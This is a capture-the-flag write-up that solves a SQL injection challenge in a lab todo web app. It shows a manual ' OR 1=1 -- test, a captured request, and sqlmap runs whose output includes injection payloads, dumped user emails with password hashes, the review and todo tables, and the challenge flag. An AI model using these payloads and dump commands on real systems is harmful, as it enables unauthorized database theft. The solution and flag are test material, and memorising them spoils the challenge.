# Sneaky Reviews 
**Proposed difficulty**: Medium

Jeg er ved at oprette en webapp til at administrere todos, du kan tjekke den på sneeky-reviews.hkn Lad mig vide hvad du tænker.

[http://sneeky-reviews.hkn/]

## Walkthrough
In challenge we gain access to the website `http://sneeky-reviews.hkn/`:

![Landing page](./img/todo-landing.png)

Creating a user and loggin in we are now greeted this this home page:

![](./img/todo-home.png)

We can create notes on to the todo page:

![](./img/todo-creation.png)

Adding this todo to the list we get:
![](./img/todo-notes.png)

Now to the main part of the challenge is to realize that the search bar is vulnerable to SQLi, which we can test something as simple as how it handles `' OR 1=1 --`:

![](./img/sqli-test.png)

We can quickly see that it does not handle `' OR 1=1 --` very well. We get a lot of new entires from some table in a database, but none of the entries contains the flag, so to see if there are other tables on the database using `sqlmap` will help greatly.

Firstly we need to capture a GET request from the search bar, which I put inside the file `request.txt`:

```
GET /search?s=asd HTTP/1.1
Host: sneeky-reviews.hkn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://sneeky-reviews.hkn/search?s=%27
Cookie: session=.eJwljrsSwkAIAP-F2gK4B5CfcbiDG20TUzn-u3FsttudfcN97Xk8YHvtZ97g_gzYADGKe8EuyZak1lJqG11ssVuzC1OEvNaYo6DX1dg1dRZXjdHJdHVHWhz0C3GEjSE9akM3S-c2zWY1UpbO3Baq42XgGlIs4Ro5j9z_N9Th8wW_qy7p.ZDqXpw.fSO8RO5nBtXrr32sv_vBW-_Vsuc
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```

Running a simple sqlmap will not yield anything, so setting that aggresiveness and the risk levels up (This generates a lot more noise) we get the `sqlmap -r request.txt --level=3 --risk 3 --threads=10` command. Note that you might want to adjust `10`to another number depending on how many threads your CPU has. This gives the output:

```
$ sqlmap -r request.txt --level=3 --risk 3 --threads=10 

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:49:09 /2023-04-15/

[14:49:09] [INFO] parsing HTTP request from 'request.txt'
[14:49:09] [INFO] resuming back-end DBMS 'sqlite' 
[14:49:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: s (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: s=-2344' OR 2411=2411-- UDjV

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: s=asd' OR 8965=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- PTai

    Type: UNION query
    Title: Generic UNION query (random number) - 5 columns
    Payload: s=asd' UNION ALL SELECT CHAR(113,107,113,118,113)||CHAR(106,104,70,70,112,121,113,120,71,120,103,70,97,118,117,117,120,100,72,80,109,72,114,106,83,77,106,97,87,98,79,88,76,119,67,106,89,117,86,73)||CHAR(113,107,112,120,113),5778,5778,5778,5778-- FFWD
---
[14:49:09] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[14:49:09] [INFO] fetched data logged to text files under '/home/<user>/.local/share/sqlmap/output/sneeky-reviews.hkn'

[*] ending @ 14:49:09 /2023-04-15/

```

Now that we have found that the `s` parameter is vulnerable we have discovered some tables, which we can get using `sqlmap -r request.txt --tables`  we get:


```
$ sqlmap -r request.txt --tables

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:48:48 /2023-04-15/

[14:48:48] [INFO] parsing HTTP request from 'request.txt'
[14:48:48] [INFO] resuming back-end DBMS 'sqlite' 
[14:48:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: s (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: s=-2344' OR 2411=2411-- UDjV

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: s=asd' OR 8965=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- PTai

    Type: UNION query
    Title: Generic UNION query (random number) - 5 columns
    Payload: s=asd' UNION ALL SELECT CHAR(113,107,113,118,113)||CHAR(106,104,70,70,112,121,113,120,71,120,103,70,97,118,117,117,120,100,72,80,109,72,114,106,83,77,106,97,87,98,79,88,76,119,67,106,89,117,86,73)||CHAR(113,107,112,120,113),5778,5778,5778,5778-- FFWD
---
[14:48:48] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[14:48:48] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[3 tables]
+---------+
| reviews |
| todos   |
| users   |
+---------+

[14:48:48] [INFO] fetched data logged to text files under '/home/bruh/.local/share/sqlmap/output/sneeky-reviews.hkn'

[*] ending @ 14:48:48 /2023-04-15/
```

So there are 3 tables that we can inspect: reviews, todos and users. Since the challenge title contains `review` checking the `reviews` table might be a good idea. We can do this using `sqlmap -r request.txt --dump reviews`:

```
$ sqlmap -r request.txt --dump reviews

        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:48:38 /2023-04-15/

[14:48:38] [INFO] parsing HTTP request from 'request.txt'
[14:48:38] [INFO] resuming back-end DBMS 'sqlite' 
[14:48:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: s (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: s=-2344' OR 2411=2411-- UDjV

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: s=asd' OR 8965=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- PTai

    Type: UNION query
    Title: Generic UNION query (random number) - 5 columns
    Payload: s=asd' UNION ALL SELECT CHAR(113,107,113,118,113)||CHAR(106,104,70,70,112,121,113,120,71,120,103,70,97,118,117,117,120,100,72,80,109,72,114,106,83,77,106,97,87,98,79,88,76,119,67,106,89,117,86,73)||CHAR(113,107,112,120,113),5778,5778,5778,5778-- FFWD
---
[14:48:38] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[14:48:38] [INFO] fetching tables for database: 'SQLite_masterdb'
[14:48:38] [INFO] fetching columns for table 'users' 
[14:48:38] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[16 entries]
+----+------------------------------+--------------------------------------------------------------+------------+------------+
| id | email                        | password                                                     | last_name  | first_name |
+----+------------------------------+--------------------------------------------------------------+------------+------------+
| 1  | kristacunningham@example.org | $2b$12$5w5HCTgQ2UccUqjJLQF9.u4i/OBZw/Gr/ASl75kRvfVlWdfw7Y4ty | Ortiz      | Nicole     |
| 2  | rsmith@example.com           | $2b$12$ZkWMLn.9z0bYzI1pcav/mOoypARnAQSXVNH3sMOD8WFRpV9BeVbuO | Peterson   | Sharon     |
| 3  | daniel74@example.org         | $2b$12$68n2LrO0L2UNmFUD2mO9.O7aFYaddEcug0FIS360kqcTzvpTFvLfe | Russell    | Sean       |
| 4  | larry90@example.com          | $2b$12$eHlmr5JcPA4IZlLXc0FbtOaRRAxdph.EeESu6Un9bPTKfSLD31N5i | Perry      | Kara       |
| 5  | xkemp@example.org            | $2b$12$tZy7UFERMW1raedQBD7L4.J/0XNVe6lTXUolf15DSFa7Za6NZWkZa | Richardson | Maria      |
| 6  | jimenezanthony@example.net   | $2b$12$lpWhcUv83XqePs18TrE1kObWiqjW8gpVJC9yEgSLgw5MnDSSY2QIi | Fuller     | David      |
| 7  | daviskatrina@example.net     | $2b$12$OIr9zdRmi1dxE.D8jHEqsuNtk3hzvkfdwEvQoqQvmNRm5G6dLe0SS | Franklin   | Bailey     |
| 8  | gbruce@example.com           | $2b$12$ES24hGAsNPnGff5VCpwEoePKSUCa4vBwE5oKYhtjw1P0owjEw6JRC | Lawson     | Courtney   |
| 9  | bjones@example.com           | $2b$12$2meh8ZDrirHC11iJ8u.BV.Z/6oCKq/GfYTL9vm.gAnZmch/SP37O2 | Thompson   | Jason      |
| 10 | jamesrobert@example.org      | $2b$12$jgeE9cSprkg5Tc8VbCnhA.PCCJuBtrxxklfJpn3jqhkmMG8OWMka2 | Wallace    | Caitlin    |
| 11 | lwilliams@example.com        | $2b$12$kY2NCQ2nHhcYOwtGuUX3IO4EMkAjLGfSoWFWIP0KoKUQznBXa55q6 | Porter     | Peter      |
| 12 | agarza@example.org           | $2b$12$7RoAdTJOyBiIo8jWmxlJMeIPm3lMvhVKPG/e2KRzCjwqx7cbh7AQC | Gross      | Andre      |
| 13 | chavezjoe@example.net        | $2b$12$DM8AN3aFKpbCtgdN.FF36eiCod7o6.yHXl/f6YGXyuN.zMTXDG36G | Stewart    | Kirk       |
| 14 | anthonyriddle@example.com    | $2b$12$0UnBigJ9TRuJy.CI5IhhJe51VhZEjq8GwMJ90diMYu20EoJEYjnVm | Navarro    | Dylan      |
| 15 | ymartinez@example.com        | $2b$12$xKIUmbMGgPSGg.0z0XGSxucmxierpoyj/jx5uMgTB2sg0qKfKuNkC | Davis      | Donald     |
| 16 | ok@ok.ok                     | $2b$12$3NZ3yDysBJqrr2Rkz4gQTOqGw8otamoQTrF6jMQug99qKXME9kagS | ok         | ok         |
+----+------------------------------+--------------------------------------------------------------+------------+------------+

[14:48:38] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/bruh/.local/share/sqlmap/output/sneeky-reviews.hkn/dump/SQLite_masterdb/users.csv'
[14:48:38] [INFO] fetching columns for table 'reviews' 
[14:48:38] [INFO] fetching entries for table 'reviews'
Database: <current>
Table: reviews
[24 entries]
+----+----------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------+-------+-------------------+
| id | note                                               | text                                                                                                                         | draft | author            |
+----+----------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------+-------+-------------------+
| 1  | NULL                                               | We started using this for our "Fun with Flags" fan club.                                                                     | 1     | Peter Porter      |
| 2  | NULL                                               | I am getting tired of this website 🙄                                                                                        | 0     | Jason Thompson    |
| 3  | NULL                                               | It's free but quite basic.                                                                                                   | 0     | Kara Perry        |
| 4  | NULL                                               | The search feature is very handy and straightforward.                                                                        | 0     | Sharon Peterson   |
| 5  | NULL                                               | We found a bug in the CTF challenge itself. If you're reading this know that we managed to delete all flags for your team 😈 | 1     | Maria Richardson  |
| 6  | NULL                                               | It's your average todo webapp, nothing fancy but it works                                                                    | 1     | Nicole Ortiz      |
| 7  | NULL                                               | Not I can see the door of my fridge again, no more post-its!                                                                 | 0     | David Fuller      |
| 8  | NULL                                               | The search feature is very handy and straightforward.                                                                        | 1     | Sean Russell      |
| 9  | NULL                                               | I simply love it! 😍                                                                                                         | 0     | Maria Richardson  |
| 10 | NULL                                               | I migrated from post-its and I am not looking back!                                                                          | 0     | Courtney Lawson   |
| 11 | NULL                                               | It's free but quite basic.                                                                                                   | 1     | Caitlin Wallace   |
| 12 | DDC{1_c0uld_h4v3_dr0pp3d_3v3ryth1ng_but_1_4m_n1c3} | 🇩🇰                                                                                                                         | 1     | Flaggy McFlagface |
| 13 | NULL                                               | I migrated from post-its and I am not looking back!                                                                          | 1     | Kara Perry        |
| 14 | NULL                                               | It's an endless parade of vulnerabilities only a noob would every write. Learn how to program!                               | 0     | Peter Porter      |
| 15 | NULL                                               | I simply love it! 😍                                                                                                         | 1     | Jason Thompson    |
| 16 | NULL                                               | We found a bug in the CTF challenge itself. If you're reading this know that we managed to delete all flags for your team 😈 | 0     | Bailey Franklin   |
| 17 | NULL                                               | Here is your review, stop asking to review your app!                                                                         | 0     | Caitlin Wallace   |
| 18 | NULL                                               | Here is your review, stop asking to review your app!                                                                         | 1     | Sharon Peterson   |
| 19 | NULL                                               | He who laughs at himself never runs out of things to laugh at.                                                               | 0     | Epictetus         |
| 20 | NULL                                               | Not I can see the door of my fridge again, no more post-its!                                                                 | 1     | Bailey Franklin   |
| 21 | NULL                                               | We started using this for our "Fun with Flags" fan club.                                                                     | 0     | Nicole Ortiz      |
| 22 | NULL                                               | It's your average todo webapp, nothing fancy but it works                                                                    | 0     | Sean Russell      |
| 23 | NULL                                               | It's an endless parade of vulnerabilities only a noob would every write. Learn how to program!                               | 1     | Courtney Lawson   |
| 24 | NULL                                               | I am getting tired of this website 🙄                                                                                        | 1     | David Fuller      |
+----+----------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------+-------+-------------------+

[14:48:38] [INFO] table 'SQLite_masterdb.reviews' dumped to CSV file '/home/bruh/.local/share/sqlmap/output/sneeky-reviews.hkn/dump/SQLite_masterdb/reviews.csv'
[14:48:38] [INFO] fetching columns for table 'todos' 
[14:48:38] [INFO] fetching entries for table 'todos'
Database: <current>
Table: todos
[165 entries]
+-----+---------+-----------------------------------------------------------------+---------------------------------------------------------------+-----------+
| id  | user_id | title                                                           | details                                                       | completed |
+-----+---------+-----------------------------------------------------------------+---------------------------------------------------------------+-----------+
| 1   | 1       | Customer name child size.                                       | Any her night commercial reason professional trouble.         | 1         |
| 2   | 1       | My second place art recognize spring number.                    | End media relate which season former.                         | 1         |
| 3   | 2       | Stock eight trial available rate assume.                        | Authority reach night tax continue nearly explain.            | 1         |
| 4   | 2       | American simply account up.                                     | Site if statement about.                                      | 0         |
| 5   | 2       | Cell direction population financial table.                      | Action but instead give effect about.                         | 0         |
| 6   | 2       | Religious this red ability loss before use case.                | Into allow structure collection.                              | 0         |
| 7   | 2       | Information quite work sister great some executive report.      | Evening method education main information air.                | 1         |
| 8   | 2       | Party always child thing.                                       | Her statement radio happy series design hour southern.        | 0         |
| 9   | 2       | Foreign official indeed budget training pass walk.              | Personal south threat remember security bring skin.           | 0         |
| 10  | 2       | Someone star quickly radio kitchen.                             | Suddenly space scientist prepare.                             | 0         |
| 11  | 2       | Couple serious leave six.                                       | Join than study well professional decision.                   | 0         |
| 12  | 2       | Mean center hard.                                               | Story office short.                                           | 1         |
| 13  | 2       | Sit game bar effort almost ago.                                 | Hard world add none even guy computer a.                      | 0         |
| 14  | 2       | Listen total computer.                                          | Civil ten suddenly share.                                     | 0         |
| 15  | 2       | Worry live notice wish.                                         | Add act number move stand rule.                               | 1         |
| 16  | 2       | Easy at eye speech might suffer stock.                          | Manage seem physical car believe.                             | 0         |
| 17  | 2       | Born along administration what.                                 | Six local baby gun decide by hot.                             | 0         |
| 18  | 2       | Responsibility draw feeling.                                    | Senior property official section director five.               | 0         |
| 19  | 2       | Inside arm Congress upon behind type debate.                    | Black some shoulder section.                                  | 0         |
| 20  | 3       | One between produce place impact official.                      | Page between wish again drop.                                 | 0         |
| 21  | 3       | Artist both prove network.                                      | Last should education upon use itself bar.                    | 0         |
| 22  | 3       | Environmental stand hope happy never same job federal.          | Different south until memory contain million significant.     | 1         |
| 23  | 3       | Country toward should middle determine.                         | Red society same term.                                        | 1         |
| 24  | 3       | Let four east inside however scene occur throughout.            | On those shake blood.                                         | 1         |
| 25  | 3       | Somebody ask focus player authority open deep.                  | Everything hundred meet such begin range.                     | 1         |
| 26  | 3       | Election recent remember.                                       | Writer end and mission despite.                               | 1         |
| 27  | 4       | Floor deal two perhaps important technology several bag.        | Financial himself their sport trial.                          | 0         |
| 28  | 4       | Approach far through.                                           | Impact care expert beautiful us.                              | 0         |
| 29  | 4       | Majority product clear.                                         | Information especially base TV particular beautiful their.    | 0         |
| 30  | 4       | Current a likely decade authority once author.                  | East explain decade central investment travel lead anyone.    | 0         |
| 31  | 4       | Program say brother property ball class international.          | Financial miss it pattern station today.                      | 1         |
| 32  | 4       | Important charge line.                                          | Other rich grow character.                                    | 1         |
| 33  | 4       | Administration prevent stuff grow white business position.      | Conference live around whether sit power.                     | 0         |
| 34  | 4       | Size avoid reveal evening example.                              | Believe base rule him return spend majority share.            | 1         |
| 35  | 4       | Evidence possible well next effect yard.                        | Real film girl collection responsibility.                     | 0         |
| 36  | 4       | Exactly involve sit week purpose general some.                  | Hope figure set study lose edge.                              | 0         |
| 37  | 4       | Admit each some.                                                | Process too argue fact authority ready home.                  | 0         |
| 38  | 4       | Southern memory game heart use fear already.                    | Religious million by.                                         | 0         |
| 39  | 5       | Light then natural front especially I perform science.          | Skin while southern page year.                                | 1         |
| 40  | 5       | Indeed add Mr age them listen.                                  | Nice citizen happen age recently.                             | 0         |
| 41  | 5       | Culture human all worker maybe should walk that.                | Board investment example front education talk name.           | 0         |
| 42  | 5       | Opportunity TV have glass.                                      | Feeling five former music.                                    | 1         |
| 43  | 5       | Financial card result animal student.                           | Budget build mean growth.                                     | 1         |
| 44  | 5       | Benefit again market voice social exactly institution many.     | Know already fact door decide camera control.                 | 0         |
| 45  | 5       | Discussion along rather letter institution road list.           | Available loss technology yes next.                           | 0         |
| 46  | 5       | Floor shake commercial war strong.                              | Rich inside memory surface trouble safe.                      | 0         |
| 47  | 5       | Century win since writer.                                       | Treat field produce age wear.                                 | 1         |
| 48  | 5       | Two writer economic less as anything cup.                       | Sign teacher computer policy low.                             | 0         |
| 49  | 5       | Federal board few cold yet cover main.                          | Effect adult with than find state hope.                       | 0         |
| 50  | 5       | Site back camera act already.                                   | Party everyone reflect after.                                 | 1         |
| 51  | 6       | Huge evidence adult power little Democrat.                      | Member local individual.                                      | 0         |
| 52  | 6       | Better especially with tough every child threat everybody.      | End lawyer story plant effort along produce.                  | 0         |
| 53  | 6       | Special beat camera indeed notice everybody.                    | Right half even strong we.                                    | 0         |
| 54  | 6       | With west soon identify note anyone.                            | End unit care they.                                           | 0         |
| 55  | 6       | Out kitchen order religious accept doctor.                      | Test professional floor to.                                   | 0         |
| 56  | 6       | Arm environmental none walk goal assume evidence.               | Prepare election business example part kitchen.               | 1         |
| 57  | 6       | Out identify foreign.                                           | Ever first together wall second thank draw.                   | 0         |
| 58  | 6       | Benefit must lead family necessary whom reality.                | Past bit recent road probably continue guy.                   | 1         |
| 59  | 6       | Program themselves behavior PM eye almost.                      | Enough sea media leave design on.                             | 0         |
| 60  | 6       | Leader myself already by physical quite support.                | Report per military democratic business.                      | 0         |
| 61  | 6       | North thousand employee clearly alone debate you increase.      | Test go attorney teacher begin shake question and.            | 0         |
| 62  | 6       | Magazine type church red much.                                  | See story without program image such task.                    | 0         |
| 63  | 6       | Protect song your chair.                                        | Mission thing benefit gas late drug by.                       | 0         |
| 64  | 6       | Marriage or know much learn.                                    | Usually trial six financial.                                  | 1         |
| 65  | 6       | Light model claim trial.                                        | Environmental century share another.                          | 0         |
| 66  | 6       | Any affect son case her.                                        | Adult line wish painting investment maybe describe.           | 0         |
| 67  | 6       | Help color fly gas street.                                      | Board four condition thus garden.                             | 0         |
| 68  | 6       | American data stuff from meeting.                               | Clearly modern success customer people miss support.          | 0         |
| 69  | 6       | Trade student defense area without.                             | Traditional window create pretty.                             | 1         |
| 70  | 6       | Option beyond work north politics site west.                    | Hear though hot theory station thank major.                   | 0         |
| 71  | 7       | Read democratic learn visit price stop.                         | Tough away happy best base bring.                             | 0         |
| 72  | 7       | Eye house case recent interview.                                | Easy ever mother return.                                      | 0         |
| 73  | 7       | Science do modern answer yet stuff might high.                  | Example allow market between happy view last less.            | 0         |
| 74  | 7       | Western improve most bed song.                                  | Market suggest remain memory as experience either.            | 0         |
| 75  | 7       | On behind imagine try.                                          | Machine before true up choice.                                | 0         |
| 76  | 7       | Bag young drive color possible.                                 | Special rate yes vote.                                        | 0         |
| 77  | 7       | Interest conference mouth would improve become consider.        | Weight south international.                                   | 0         |
| 78  | 7       | Must husband high pass usually list situation friend.           | Guy process follow affect look remain.                        | 0         |
| 79  | 7       | Message hear recently common bar region company.                | Head term war world north first become.                       | 0         |
| 80  | 7       | Pick choose reflect soon rate out.                              | World establish law letter election PM success rich.          | 0         |
| 81  | 7       | Challenge eight sure indeed standard remain I important.        | Out movie out light generation use.                           | 1         |
| 82  | 7       | Ready early media hand page course.                             | Make picture enough interesting.                              | 0         |
| 83  | 7       | Realize fall company hundred sense do.                          | Mother look plant old.                                        | 0         |
| 84  | 7       | Clearly reveal whether special.                                 | Interesting to speak lose quickly decade drug.                | 0         |
| 85  | 7       | Final every room join.                                          | Bag father develop majority Congress floor.                   | 0         |
| 86  | 7       | Number ten brother she order job threat.                        | Newspaper fine political position understand these do.        | 0         |
| 87  | 7       | Condition style listen so describe.                             | Nor during along window should scientist.                     | 0         |
| 88  | 7       | Support operation important environmental cover product dinner. | Theory teacher difficult choose budget.                       | 1         |
| 89  | 7       | Just TV region notice use might.                                | Lead special must ok sell audience.                           | 0         |
| 90  | 8       | Surface because decision.                                       | College center laugh require yeah movement.                   | 1         |
| 91  | 8       | Very life admit natural security.                               | Career seven hospital fear.                                   | 0         |
| 92  | 8       | Despite himself available address decide.                       | Act step up protect.                                          | 1         |
| 93  | 8       | Share establish stand method southern argue.                    | Dinner pattern rule night.                                    | 0         |
| 94  | 8       | Appear my type step lay economic difficult.                     | Care they necessary down.                                     | 0         |
| 95  | 8       | Candidate imagine take trouble strong mind think door.          | Executive toward their effect edge everybody notice.          | 0         |
| 96  | 8       | That staff operation wife box their medical.                    | Suggest would know three answer security five.                | 1         |
| 97  | 8       | Middle decide recent budget tax born can something.             | Later may daughter somebody.                                  | 1         |
| 98  | 8       | Ahead student many suggest financial determine compare.         | Very usually eye to age use could.                            | 1         |
| 99  | 8       | Word sister probably serve wait quickly.                        | Hold writer free dark.                                        | 0         |
| 100 | 8       | Decade wide interview grow.                                     | Imagine drop save detail.                                     | 1         |
| 101 | 8       | And organization value than century reduce dinner.              | Recent miss design figure despite.                            | 1         |
| 102 | 8       | Region ok state whatever or.                                    | Although ok including certain.                                | 0         |
| 103 | 8       | Step strong realize.                                            | Stop impact play pay rate more difference.                    | 0         |
| 104 | 8       | Bag push parent hear.                                           | Leader five official population.                              | 0         |
| 105 | 8       | Any think husband or language investment.                       | Soldier reduce network face open product.                     | 0         |
| 106 | 8       | Deal include trip guess.                                        | Quite painting ability maintain sure such speak.              | 0         |
| 107 | 8       | Generation exist sure actually foreign.                         | Few bad rich entire mind collection ahead.                    | 0         |
| 108 | 8       | Dog series agree your push involve board.                       | Fall risk blue material business.                             | 0         |
| 109 | 9       | Food life study.                                                | Gas until detail.                                             | 1         |
| 110 | 10      | Kind interesting cut environmental whom.                        | Act keep analysis adult dark.                                 | 0         |
| 111 | 10      | Develop on any outside build today.                             | Test dark improve not.                                        | 0         |
| 112 | 10      | Any occur production scientist foreign.                         | Drop husband trade beautiful.                                 | 0         |
| 113 | 10      | Usually military generation.                                    | Sign whose any value style live.                              | 0         |
| 114 | 10      | Say owner time cut wife set ahead.                              | Line center read everything federal.                          | 0         |
| 115 | 10      | Focus loss compare foot effort gas name.                        | Anything budget international perhaps whatever state.         | 0         |
| 116 | 10      | Leader community science remain lose create game.               | Place way shoulder kitchen weight.                            | 1         |
| 117 | 10      | Today control like perform.                                     | Fight wind business well smile key.                           | 1         |
| 118 | 10      | Everything appear especially west board message anything.       | Time baby score performance more crime.                       | 0         |
| 119 | 10      | Take report a animal process civil state across.                | Think daughter thought this will.                             | 0         |
| 120 | 10      | Attorney guy around chance visit give her such.                 | Structure four start assume phone rule.                       | 0         |
| 121 | 10      | Guess present staff sell note wonder change.                    | Purpose may follow usually right energy medical.              | 0         |
| 122 | 10      | Radio degree provide friend example training.                   | Follow stuff PM power spring majority behind.                 | 0         |
| 123 | 10      | College teach article part.                                     | Seat could cold apply.                                        | 0         |
| 124 | 10      | Place least current soon draw thus include shoulder.            | Case piece ahead several without light.                       | 0         |
| 125 | 10      | Adult military lawyer approach.                                 | My present your move feel grow city.                          | 0         |
| 126 | 10      | Class third news dog speech.                                    | In shake Mrs after.                                           | 1         |
| 127 | 10      | Stuff energy husband action.                                    | General car mind owner address dream oil.                     | 0         |
| 128 | 10      | Daughter out win.                                               | Everybody finish present behind wonder standard sometimes.    | 0         |
| 129 | 10      | Nothing even hold way.                                          | Board meeting free race method.                               | 1         |
| 130 | 11      | News stock time those.                                          | Power finally interesting government name note.               | 0         |
| 131 | 11      | How seven beautiful source international serious.               | Suddenly catch member forget between near win bar.            | 0         |
| 132 | 11      | Either here professional low upon.                              | Manager prove will drive woman close.                         | 0         |
| 133 | 11      | Social understand rise college remember product total.          | Rise her relate here none old.                                | 1         |
| 134 | 11      | Statement effort history front son camera mouth.                | Measure such identify star minute.                            | 0         |
| 135 | 11      | Yard personal professional.                                     | Pay decision top thing all pass.                              | 0         |
| 136 | 11      | Spring use seem something.                                      | Just third whom live.                                         | 0         |
| 137 | 11      | Attorney understand unit.                                       | Black civil clearly clear again feeling bag.                  | 0         |
| 138 | 11      | Within hope prove together.                                     | Another over population friend data.                          | 1         |
| 139 | 11      | Still seem case expert concern state analysis list.             | Face method while prepare involve suddenly identify live.     | 1         |
| 140 | 11      | Of important large others.                                      | Else among fine sense.                                        | 1         |
| 141 | 11      | These you their manage interest.                                | Attorney amount organization.                                 | 0         |
| 142 | 11      | Position who maintain national finish series front.             | Rule bed garden house debate.                                 | 1         |
| 143 | 11      | Three option company story.                                     | Member worker baby member cold.                               | 0         |
| 144 | 11      | Easy conference tonight national.                               | Wait Congress open.                                           | 1         |
| 145 | 11      | Democrat prevent what born wind.                                | Film again west mean than account not.                        | 1         |
| 146 | 12      | Smile left not mind race.                                       | High third group he avoid worker debate article.              | 0         |
| 147 | 12      | Everyone food reflect face list recognize letter.               | West particularly concern me owner off.                       | 0         |
| 148 | 14      | Game miss data actually environment spring suggest.             | Street customer glass anyone wall interest girl.              | 1         |
| 149 | 14      | Success even fund.                                              | Evening century beat police deep quality.                     | 0         |
| 150 | 14      | Worker ahead when fact like window.                             | Claim level night strong bad also prove.                      | 0         |
| 151 | 14      | Investment specific ten authority.                              | Sort view participant yard enough study.                      | 1         |
| 152 | 14      | Husband be thank be improve medical image Mrs.                  | Participant seven show nearly.                                | 1         |
| 153 | 14      | Radio bill former wall.                                         | Population seven school someone operation require individual. | 1         |
| 154 | 14      | Ok blue event tell step until.                                  | Wonder member require.                                        | 0         |
| 155 | 14      | Concern sing television financial.                              | Long huge free spend.                                         | 0         |
| 156 | 14      | Character almost Mr human Democrat.                             | Later health cup read.                                        | 0         |
| 157 | 14      | Experience yes member case.                                     | Or special avoid practice.                                    | 1         |
| 158 | 15      | Time beautiful drop worry be enter.                             | Eat any receive bit few add thought shake.                    | 1         |
| 159 | 15      | Environmental red population writer forward on room provide.    | Show decision investment Congress wind.                       | 0         |
| 160 | 15      | Left determine administration best town avoid.                  | Fill as similar pressure.                                     | 0         |
| 161 | 15      | Not I throw simple form west describe.                          | That break individual already ground game buy.                | 0         |
| 162 | 15      | Range director economy treatment three minute evening large.    | Instead rock both consumer.                                   | 0         |
| 163 | 15      | Study present current away this.                                | Executive guess whom themselves reduce north material.        | 0         |
| 164 | 15      | Again very discuss structure catch.                             | Could check remember size.                                    | 0         |
| 165 | 16      | hello there!                                                    | bruhbruh                                                      | 1         |
+-----+---------+-----------------------------------------------------------------+---------------------------------------------------------------+-----------+

[14:48:38] [INFO] table 'SQLite_masterdb.todos' dumped to CSV file '/home/bruh/.local/share/sqlmap/output/sneeky-reviews.hkn/dump/SQLite_masterdb/todos.csv'
[14:48:38] [INFO] fetched data logged to text files under '/home/bruh/.local/share/sqlmap/output/sneeky-reviews.hkn'

[*] ending @ 14:48:38 /2023-04-15
```

There is quite a lot to look at, under the reviews table we get the flag.

## Flag
DDC{1_c0uld_h4v3_dr0pp3d_3v3ryth1ng_but_1_4m_n1c3}